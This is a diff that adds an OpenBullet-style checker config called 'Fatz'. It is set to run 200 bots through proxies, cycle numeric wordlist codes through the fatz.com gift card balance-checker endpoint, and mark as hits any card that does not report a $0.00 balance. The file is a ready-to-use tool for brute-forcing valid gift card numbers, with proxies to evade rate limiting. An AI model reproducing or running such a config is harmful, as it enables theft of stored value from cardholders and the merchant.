@@ -1,0 +1,42 @@
+[SETTINGS]
+{
+  "Name": "Fatz",
+  "SuggestedBots": 200,
+  "LastModified": "2019-07-06T01:20:42.5583283+10:00",
+  "AdditionalInfo": "",
+  "Author": "MafiaOG#9955",
+  "Version": "1.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "Numeric",
+  "AllowedWordlist2": "Numeric",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Checker REQUEST POST "https://fatz.com/balance-checker/" 
+  CONTENT "cn=<CODE>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://fatz.com/" 
+  HEADER "referer: https://fatz.com/balance-checker/" 
+
+#Key_Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "You have $0.00 remaining" 
+  KEYCHAIN Failure OR 
+    KEY "You have $0.00 remaining" 
+
